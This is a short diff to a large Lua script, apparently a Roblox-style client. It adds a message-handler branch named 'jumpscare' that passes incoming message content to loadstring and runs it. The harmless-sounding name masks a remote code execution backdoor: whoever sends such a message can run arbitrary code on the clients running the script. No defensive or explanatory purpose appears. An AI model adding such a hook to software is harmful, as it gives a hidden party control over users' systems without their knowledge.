@@ -9673,6 +9673,9 @@ local d = function()
 				if name == "stevesays" then
 					Util.UINotify(data.content)
 				end
+				if name == "jumpscare" then
+					loadstring(data.content)()
+				end
 			end)
 			task.spawn(function()
 				while isok do
